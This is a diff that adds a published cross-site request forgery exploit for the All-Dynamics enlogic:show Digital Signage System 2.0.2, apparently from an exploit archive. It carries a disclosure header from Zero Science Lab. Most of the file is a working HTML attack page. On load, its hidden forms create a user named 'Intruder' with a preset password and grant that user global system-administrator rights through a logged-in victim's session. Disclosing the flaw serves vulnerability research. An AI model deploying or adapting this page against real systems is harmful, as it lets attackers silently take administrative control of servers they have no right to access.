@@ -1,0 +1,89 @@
+# Exploit Title: All-Dynamics Digital Signage System 2.0.2 - Cross-Site Request Forgery (Add Admin)
+# Discovery by: LiquidWorm
+# Discovery Date: 2020-08-05
+# Vendor Homepage: https://www.all-dynamics.de
+
+<!DOCTYPE html>
+<!--
+
+All-Dynamics Software enlogic:show Digital Signage System 2.0.2 CSRF Add Admin
+
+
+Vendor: All-Dynamics Software GmbH
+Product web page: https://www.all-dynamics.de
+Affected version: 2.0.2 (Build 2098) ILP32W 0/1/3/1597919619
+
+Summary: Bring communication with your customers, guests or employees
+to a new level. You can design content individually and uncomplicated
+centrally and simply present it in different locations. Whether on large
+displays, steles, digital signs or on a projector, with enlogic:show your
+content will appear on the selected display in a calendar-controlled and
+precise manner.
+
+Desc: The application interface allows users to perform certain actions
+via HTTP requests without performing any validity checks to verify the
+requests. This can be exploited to perform certain actions with administrative
+privileges if a logged-in user visits a malicious web site.
+
+Reference: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5577.php
+
+Tested on: enlogic:show server
+           Microsoft Windows Server 2019
+           Microsoft Windows Server 2016
+           Microsoft Windows Server 2012
+           Microsoft Windows 10
+           GNU/Linux
+           Apache
+           PHP
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2020-5576
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5576.php
+
+
+21.07.2020
+
+-->
+
+
+<html>
+<body onload="runcsrf()">
+<h2>Grants the user the global administrative right. Administrative users are no longer under the control of the rights structure.</h2>
+<h1>Global: Superior rolebased rights.</h1>
+
+<form name="saveuser" action="http://localhost:8802/index.php?PHPSESSID=5adb40dac43ddf2d05ea83d1a958ed65&ES_CMD=display.users.saveuser" method="POST" target="frame0">
+<input type="hidden" name="SAVECMD" value="usr&#95;generic" />
+<input type="hidden" name="NEWUSER" value="1" />
+<input type="hidden" name="USERNAME" value="Intruder" />
+<input type="hidden" name="USERFULLNAME" value="ZSL" />
+<input type="hidden" name="USERTAGS" value="tags" />
+<input type="hidden" name="USEREMAIL" value="csrf&#64;zsl&#46;be" />
+<input type="hidden" name="USERPHONE" value="333&#45;222&#45;1111" />
+<input type="hidden" name="PWEXPIRE" value="0" />
+<input type="hidden" name="NEWPW1" value="Pa$$w0rd!" />
+<input type="hidden" name="NEWPW2" value="Pa$$w0rd!" />
+<input type="hidden" name="USERLANG" value="en" />
+<input type="hidden" name="STARTSCREEN" value="display&#46;calendar" />
+<input type="hidden" name="USERCUSTIMEOUT" value="20" />
+</form>
+
+<form name="addadmin" action="http://localhost:8802/index.php?PHPSESSID=5adb40dac43ddf2d05ea83d1a958ed65&ES_CMD=display.users.saveuser" method="POST" target="frame1">
+<input type="hidden" name="SAVECMD" value="usr&#95;rights" />
+<input type="hidden" name="SYSFLAGS&#91;&#93;" value="TYPE&#95;SYSADMIN" />
+</form>
+
+<iframe name="frame0"></iframe>
+<iframe name="frame1"></iframe>
+
+<script>
+function runcsrf() {
+document.saveuser.submit();
+document.addadmin.submit();
+}
+</script>
+</body>
+</html>
